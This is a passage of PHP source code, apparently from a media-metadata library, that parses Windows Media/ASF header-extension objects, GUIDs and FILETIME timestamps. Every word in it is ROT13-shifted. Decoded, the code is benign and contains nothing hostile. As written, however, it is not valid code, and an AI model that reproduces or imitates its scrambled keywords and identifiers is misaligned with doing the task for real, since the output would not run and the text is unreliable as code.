		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 14, 2)));

		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 19, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 21, 2)));

		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 24, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 26, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 28, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 30, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 32, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 34, 2)));

		erghea $urkolgrpunefgevat;
	}

	/**
	 * @cnenz fgevat $Olgrfgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba OlgrfgevatGbTHVQ($Olgrfgevat) {
		$THVQfgevat  = fge_cnq(qrpurk(beq($Olgrfgevat[3])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[2])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[1])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[0])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= '-';
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[5])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[4])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= '-';
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[7])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[6])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= '-';
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[8])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[9])),  2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= '-';
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[10])), 2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[11])), 2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[12])), 2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[13])), 2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[14])), 2, '0', FGE_CNQ_YRSG);
		$THVQfgevat .= fge_cnq(qrpurk(beq($Olgrfgevat[15])), 2, '0', FGE_CNQ_YRSG);

		erghea fgegbhccre($THVQfgevat);
	}

	/**
	 * @cnenz vag  $SVYRGVZR
	 * @cnenz obby $ebhaq
	 *
	 * @erghea sybng|vag
	 */
	choyvp fgngvp shapgvba SVYRGVZRgbHAVKgvzr($SVYRGVZR, $ebhaq=gehr) {
		// SVYRGVZR vf n 64-ovg hafvtarq vagrtre ercerfragvat
		// gur ahzore bs 100-anabfrpbaq vagreinyf fvapr Wnahnel 1, 1601
		// HAVK gvzrfgnzc vf ahzore bs frpbaqf fvapr Wnahnel 1, 1970
		// 116444736000000000 = 10000000 * 60 * 60 * 24 * 365 * 369 + 89 yrnc qnlf
		vs ($ebhaq) {
			erghea vaginy(ebhaq(($SVYRGVZR - 116444736000000000) / 10000000));
		}
		erghea ($SVYRGVZR - 116444736000000000) / 10000000;
	}

	/**
	 * @cnenz vag $JZcvpgherGlcr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba JZcvpgherGlcrYbbxhc($JZcvpgherGlcr) {
		fgngvp $ybbxhc = ahyy;
		vs ($ybbxhc === ahyy) {
			$ybbxhc = neenl(
				0k03 => 'Sebag Pbire',
				0k04 => 'Onpx Pbire',
				0k00 => 'Hfre Qrsvarq',
				0k05 => 'Yrnsyrg Cntr',
				0k06 => 'Zrqvn Ynory',
				0k07 => 'Yrnq Negvfg',
				0k08 => 'Negvfg',
				0k09 => 'Pbaqhpgbe',
				0k0N => 'Onaq',
				0k0O => 'Pbzcbfre',
				0k0P => 'Ylevpvfg',
				0k0Q => 'Erpbeqvat Ybpngvba',
				0k0R => 'Qhevat Erpbeqvat',
				0k0S => 'Qhevat Cresbeznapr',
				0k10 => 'Ivqrb Fperra Pncgher',
				0k12 => 'Vyyhfgengvba',
				0k13 => 'Onaq Ybtbglcr',
				0k14 => 'Choyvfure Ybtbglcr'
			);
			$ybbxhc = neenl_znc(shapgvba($fge) {
				erghea trgvq3_yvo::vpbai_snyyonpx('HGS-8', 'HGS-16YR', $fge);
			}, $ybbxhc);
		}

		erghea (vffrg($ybbxhc[$JZcvpgherGlcr]) ? $ybbxhc[$JZcvpgherGlcr] : '');
	}

	/**
	 * @cnenz fgevat $nfs_urnqre_rkgrafvba_bowrpg_qngn
	 * @cnenz vag    $haunaqyrq_frpgvbaf
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba UrnqreRkgrafvbaBowrpgQngnCnefr(&$nfs_urnqre_rkgrafvba_bowrpg_qngn, &$haunaqyrq_frpgvbaf) {
		// uggcf://jro.nepuvir.bet/jro/20140419205228/uggc://zfqa.zvpebfbsg.pbz/ra-hf/yvoenel/oo643323.nfck

		$bssfrg = 0;
		$bowrpgBssfrg = 0;
		$UrnqreRkgrafvbaBowrpgCnefrq = neenl();
		juvyr ($bowrpgBssfrg < fgeyra($nfs_urnqre_rkgrafvba_bowrpg_qngn)) {
			$bssfrg = $bowrpgBssfrg;
			$guvfBowrpg = neenl();

			$guvfBowrpg['thvq']                              =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 16);
			$bssfrg += 16;
			$guvfBowrpg['thvq_grkg'] = $guvf->OlgrfgevatGbTHVQ($guvfBowrpg['thvq']);
			$guvfBowrpg['thvq_anzr'] = $guvf->THVQanzr($guvfBowrpg['thvq_grkg']);

			$guvfBowrpg['fvmr']                              = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  8));
			$bssfrg += 8;
			vs ($guvfBowrpg['fvmr'] <= 0) {
				oernx;
			}

			fjvgpu ($guvfBowrpg['thvq']) {
				pnfr TRGVQ3_NFS_Rkgraqrq_Fgernz_Cebcregvrf_Bowrpg:
					$guvfBowrpg['fgneg_gvzr']                        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  8));
					$bssfrg += 8;
					$guvfBowrpg['fgneg_gvzr_havk']                   = $guvf->SVYRGVZRgbHAVKgvzr($guvfBowrpg['fgneg_gvzr']);

					$guvfBowrpg['raq_gvzr']                          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  8));
					$bssfrg += 8;
					$guvfBowrpg['raq_gvzr_havk']                     = $guvf->SVYRGVZRgbHAVKgvzr($guvfBowrpg['raq_gvzr']);

					$guvfBowrpg['qngn_ovgengr']                      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['ohssre_fvmr']                       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['vavgvny_ohssre_shyyarff']           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['nygreangr_qngn_ovgengr']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['nygreangr_ohssre_fvmr']             = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['nygreangr_vavgvny_ohssre_shyyarff'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['znkvzhz_bowrpg_fvmr']               = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;

					$guvfBowrpg['syntf_enj']                         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
					$bssfrg += 4;
					$guvfBowrpg['syntf']['eryvnoyr']                = (obby) $guvfBowrpg['syntf_enj'] & 0k00000001;
					$guvfBowrpg['syntf']['frrxnoyr']                = (obby) $guvfBowrpg['syntf_enj'] & 0k00000002;
					$guvfBowrpg['syntf']['ab_pyrnacbvagf']          = (obby) $guvfBowrpg['syntf_enj'] & 0k00000004;
					$guvfBowrpg['syntf']['erfraq_yvir_pyrnacbvagf'] = (obby) $guvfBowrpg['syntf_enj'] & 0k00000008;

					$guvfBowrpg['fgernz_ahzore']                     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					$guvfBowrpg['fgernz_ynathntr_vq_vaqrk']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					$guvfBowrpg['nirentr_gvzr_cre_senzr']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  8));
					$bssfrg += 8;

					$guvfBowrpg['fgernz_anzr_pbhag']                 = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					$guvfBowrpg['cnlybnq_rkgrafvba_flfgrz_pbhag']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['fgernz_anzr_pbhag']; $v++) {
						$fgernzAnzr = neenl();

						$fgernzAnzr['ynathntr_vq_vaqrk']             = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$fgernzAnzr['fgernz_anzr_yratgu']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$fgernzAnzr['fgernz_anzr']                   =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $fgernzAnzr['fgernz_anzr_yratgu']);
						$bssfrg += $fgernzAnzr['fgernz_anzr_yratgu'];

						$guvfBowrpg['fgernz_anzrf'][$v] = $fgernzAnzr;
					}

					sbe ($v = 0; $v < $guvfBowrpg['cnlybnq_rkgrafvba_flfgrz_pbhag']; $v++) {
						$cnlybnqRkgrafvbaFlfgrz = neenl();

						$cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vq']   =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 16);
						$bssfrg += 16;
						$cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vq_grkg'] = $guvf->OlgrfgevatGbTHVQ($cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vq']);

						$cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_fvmr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;
						vs ($cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_fvmr'] <= 0) {
							oernx 2;
						}

						$cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vasb_yratgu'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
						$bssfrg += 4;

						$cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vasb'] = fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vasb_yratgu']);
						$bssfrg += $cnlybnqRkgrafvbaFlfgrz['rkgrafvba_flfgrz_vasb_yratgu'];

						$guvfBowrpg['cnlybnq_rkgrafvba_flfgrzf'][$v] = $cnlybnqRkgrafvbaFlfgrz;
					}

					oernx;

				pnfr TRGVQ3_NFS_Nqinaprq_Zhghny_Rkpyhfvba_Bowrpg:
					$guvfBowrpg['rkpyhfvba_glcr']       = fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfBowrpg['rkpyhfvba_glcr_grkg']  = $guvf->OlgrfgevatGbTHVQ($guvfBowrpg['rkpyhfvba_glcr']);

					$guvfBowrpg['fgernz_ahzoref_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['fgernz_ahzoref_pbhag']; $v++) {
						$guvfBowrpg['fgernz_ahzoref'][$v] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;
					}

					oernx;

				pnfr TRGVQ3_NFS_Fgernz_Cevbevgvmngvba_Bowrpg:
					$guvfBowrpg['cevbevgl_erpbeqf_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['cevbevgl_erpbeqf_pbhag']; $v++) {
						$cevbevglErpbeq = neenl();

						$cevbevglErpbeq['fgernz_ahzore'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$cevbevglErpbeq['syntf_enj']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;
						$cevbevglErpbeq['syntf']['znaqngbel'] = (obby) $cevbevglErpbeq['syntf_enj'] & 0k00000001;

						$guvfBowrpg['cevbevgl_erpbeqf'][$v] = $cevbevglErpbeq;
					}

					oernx;

				pnfr TRGVQ3_NFS_Cnqqvat_Bowrpg:
					// cnqqvat, fxvc vg
					oernx;

				pnfr TRGVQ3_NFS_Zrgnqngn_Bowrpg:
					$guvfBowrpg['qrfpevcgvba_erpbeq_pbhagf'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['qrfpevcgvba_erpbeq_pbhagf']; $v++) {
						$qrfpevcgvbaErpbeq = neenl();

						$qrfpevcgvbaErpbeq['erfreirq_1']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2)); // zhfg or mreb
						$bssfrg += 2;

						$qrfpevcgvbaErpbeq['fgernz_ahzore']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$qrfpevcgvbaErpbeq['anzr_yratgu']        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$qrfpevcgvbaErpbeq['qngn_glcr']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;
						$qrfpevcgvbaErpbeq['qngn_glcr_grkg'] = frys::zrgnqngnYvoenelBowrpgQngnGlcrYbbxhc($qrfpevcgvbaErpbeq['qngn_glcr']);

						$qrfpevcgvbaErpbeq['qngn_yratgu']        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
						$bssfrg += 4;

						$qrfpevcgvbaErpbeq['anzr']               =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $qrfpevcgvbaErpbeq['anzr_yratgu']);
						$bssfrg += $qrfpevcgvbaErpbeq['anzr_yratgu'];

						$qrfpevcgvbaErpbeq['qngn']               =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $qrfpevcgvbaErpbeq['qngn_yratgu']);
						$bssfrg += $qrfpevcgvbaErpbeq['qngn_yratgu'];
						fjvgpu ($qrfpevcgvbaErpbeq['qngn_glcr']) {
							pnfr 0k0000: // Havpbqr fgevat
								oernx;

							pnfr 0k0001: // OLGR neenl
								// qb abguvat
								oernx;

							pnfr 0k0002: // OBBY
								$qrfpevcgvbaErpbeq['qngn'] = (obby) trgvq3_yvo::YvggyrRaqvna2Vag($qrfpevcgvbaErpbeq['qngn']);
								oernx;

							pnfr 0k0003: // QJBEQ
							pnfr 0k0004: // DJBEQ
							pnfr 0k0005: // JBEQ
								$qrfpevcgvbaErpbeq['qngn'] = trgvq3_yvo::YvggyrRaqvna2Vag($qrfpevcgvbaErpbeq['qngn']);
								oernx;

							pnfr 0k0006: // THVQ
								$qrfpevcgvbaErpbeq['qngn_grkg'] = $guvf->OlgrfgevatGbTHVQ($qrfpevcgvbaErpbeq['qngn']);
								oernx;
						}

						$guvfBowrpg['qrfpevcgvba_erpbeq'][$v] = $qrfpevcgvbaErpbeq;
					}
					oernx;

				pnfr TRGVQ3_NFS_Ynathntr_Yvfg_Bowrpg:
					$guvfBowrpg['ynathntr_vq_erpbeq_pbhagf'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['ynathntr_vq_erpbeq_pbhagf']; $v++) {
						$ynathntrVQerpbeq = neenl();

						$ynathntrVQerpbeq['ynathntr_vq_yratgu']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  1));
						$bssfrg += 1;

						$ynathntrVQerpbeq['ynathntr_vq']                =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $ynathntrVQerpbeq['ynathntr_vq_yratgu']);
						$bssfrg += $ynathntrVQerpbeq['ynathntr_vq_yratgu'];

						$guvfBowrpg['ynathntr_vq_erpbeq'][$v] = $ynathntrVQerpbeq;
					}
					oernx;

				pnfr TRGVQ3_NFS_Zrgnqngn_Yvoenel_Bowrpg:
					$guvfBowrpg['qrfpevcgvba_erpbeqf_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['qrfpevcgvba_erpbeqf_pbhag']; $v++) {
						$qrfpevcgvbaErpbeq = neenl();

						$qrfpevcgvbaErpbeq['ynathntr_yvfg_vaqrk'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$qrfpevcgvbaErpbeq['fgernz_ahzore']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$qrfpevcgvbaErpbeq['anzr_yratgu']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;

						$qrfpevcgvbaErpbeq['qngn_glcr']           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  2));
						$bssfrg += 2;
						$qrfpevcgvbaErpbeq['qngn_glcr_grkg'] = frys::zrgnqngnYvoenelBowrpgQngnGlcrYbbxhc($qrfpevcgvbaErpbeq['qngn_glcr']);

						$qrfpevcgvbaErpbeq['qngn_yratgu']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  4));
						$bssfrg += 4;

						$qrfpevcgvbaErpbeq['anzr']                =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $qrfpevcgvbaErpbeq['anzr_yratgu']);
						$bssfrg += $qrfpevcgvbaErpbeq['anzr_yratgu'];

						$qrfpevcgvbaErpbeq['qngn']                =                              fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg,  $qrfpevcgvbaErpbeq['qngn_yratgu']);
						$bssfrg += $qrfpevcgvbaErpbeq['qngn_yratgu'];

						vs (cert_zngpu('#^JZ/Cvpgher$#', fge_ercynpr(\"\k00\", '', gevz($qrfpevcgvbaErpbeq['anzr'])))) {
							$JZcvpgher = $guvf->NFS_JZcvpgher($qrfpevcgvbaErpbeq['qngn']);
							sbernpu ($JZcvpgher nf $xrl => $inyhr) {
								$qrfpevcgvbaErpbeq['qngn'] = $JZcvpgher;
							}
							hafrg($JZcvpgher);
						}

						$guvfBowrpg['qrfpevcgvba_erpbeq'][$v] = $qrfpevcgvbaErpbeq;
					}
					oernx;

				pnfr TRGVQ3_NFS_Vaqrk_Cnenzrgref_Bowrpg:
					$guvfBowrpg['vaqrk_ragel_gvzr_vagreiny'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 4));
					$bssfrg += 4;

					$guvfBowrpg['vaqrk_fcrpvsvref_pbhag']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['vaqrk_fcrpvsvref_pbhag']; $v++) {
						$vaqrkFcrpvsvre = neenl();

						$vaqrkFcrpvsvre['fgernz_ahzore']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;

						$vaqrkFcrpvsvre['vaqrk_glcr']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;
						$vaqrkFcrpvsvre['vaqrk_glcr_grkg'] = vffrg(fgngvp::$NFSVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf[$vaqrkFcrpvsvre['vaqrk_glcr']])
							? fgngvp::$NFSVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf[$vaqrkFcrpvsvre['vaqrk_glcr']]
							: 'vainyvq'
						;

						$guvfBowrpg['vaqrk_fcrpvsvref'][$v] = $vaqrkFcrpvsvre;
					}

					oernx;

				pnfr TRGVQ3_NFS_Zrqvn_Bowrpg_Vaqrk_Cnenzrgref_Bowrpg:
					$guvfBowrpg['vaqrk_ragel_pbhag_vagreiny'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 4));
					$bssfrg += 4;

					$guvfBowrpg['vaqrk_fcrpvsvref_pbhag']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['vaqrk_fcrpvsvref_pbhag']; $v++) {
						$vaqrkFcrpvsvre = neenl();

						$vaqrkFcrpvsvre['fgernz_ahzore']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;

						$vaqrkFcrpvsvre['vaqrk_glcr']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;
						$vaqrkFcrpvsvre['vaqrk_glcr_grkg'] = vffrg(fgngvp::$NFSZrqvnBowrpgVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf[$vaqrkFcrpvsvre['vaqrk_glcr']])
							? fgngvp::$NFSZrqvnBowrpgVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf[$vaqrkFcrpvsvre['vaqrk_glcr']]
							: 'vainyvq'
						;

						$guvfBowrpg['vaqrk_fcrpvsvref'][$v] = $vaqrkFcrpvsvre;
					}

					oernx;

				pnfr TRGVQ3_NFS_Gvzrpbqr_Vaqrk_Cnenzrgref_Bowrpg:
					// 4.11	Gvzrpbqr Vaqrk Cnenzrgref Bowrpg (znaqngbel bayl vs GVZRPBQR vaqrk vf cerfrag va svyr, 0 be 1)
					// Svryq anzr                     Svryq glcr   Fvmr (ovgf)
					// Bowrpg VQ                      THVQ         128             // THVQ sbe gur Gvzrpbqr Vaqrk Cnenzrgref Bowrpg - NFS_Gvzrpbqr_Vaqrk_Cnenzrgref_Bowrpg
					// Bowrpg Fvmr                    DJBEQ        64              // Fcrpvsvrf gur fvmr, va olgrf, bs gur Gvzrpbqr Vaqrk Cnenzrgref Bowrpg. Inyvq inyhrf ner ng yrnfg 34 olgrf.
					// Vaqrk Ragel Pbhag Vagreiny     QJBEQ        32              // Guvf inyhr vf vtaberq sbe gur Gvzrpbqr Vaqrk Cnenzrgref Bowrpg.
					// Vaqrk Fcrpvsvref Pbhag         JBEQ         16              // Fcrpvsvrf gur ahzore bs ragevrf va gur Vaqrk Fcrpvsvref yvfg. Inyvq inyhrf ner 1 naq terngre.
					// Vaqrk Fcrpvsvref               neenl bs:    inevrf          //
					// * Fgernz Ahzore                JBEQ         16              // Fcrpvsvrf gur fgernz ahzore gung gur Vaqrk Fcrpvsvref ersre gb. Inyvq inyhrf ner orgjrra 1 naq 127.
					// * Vaqrk Glcr                   JBEQ         16              // Fcrpvsvrf gur glcr bs vaqrk. Inyhrf ner qrsvarq nf sbyybjf (1 vf abg n inyvq inyhr):
					                                                               // 2 = Arnerfg Cnfg Zrqvn Bowrpg - vaqrkrf cbvag gb gur pybfrfg qngn cnpxrg pbagnvavat na ragver ivqrb senzr be gur svefg sentzrag bs n ivqrb senzr
					                                                               // 3 = Arnerfg Cnfg Pyrnacbvag - vaqrkrf cbvag gb gur pybfrfg qngn cnpxrg pbagnvavat na ragver ivqrb senzr (be svefg sentzrag bs n ivqrb senzr) gung vf n xrl senzr.
					                                                               // Arnerfg Cnfg Zrqvn Bowrpg vf gur zbfg pbzzba inyhr

					$guvfBowrpg['vaqrk_ragel_pbhag_vagreiny'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 4));
					$bssfrg += 4;

					$guvfBowrpg['vaqrk_fcrpvsvref_pbhag']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
					$bssfrg += 2;

					sbe ($v = 0; $v < $guvfBowrpg['vaqrk_fcrpvsvref_pbhag']; $v++) {
						$vaqrkFcrpvsvre = neenl();

						$vaqrkFcrpvsvre['fgernz_ahzore']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;

						$vaqrkFcrpvsvre['vaqrk_glcr']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 2));
						$bssfrg += 2;
						$vaqrkFcrpvsvre['vaqrk_glcr_grkg'] = vffrg(fgngvp::$NFSGvzrpbqrVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf[$vaqrkFcrpvsvre['vaqrk_glcr']])
							? fgngvp::$NFSGvzrpbqrVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf[$vaqrkFcrpvsvre['vaqrk_glcr']]
							: 'vainyvq'
						;

						$guvfBowrpg['vaqrk_fcrpvsvref'][$v] = $vaqrkFcrpvsvre;
					}

					oernx;

				pnfr TRGVQ3_NFS_Pbzcngvovyvgl_Bowrpg:
					$guvfBowrpg['cebsvyr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 1));
					$bssfrg += 1;

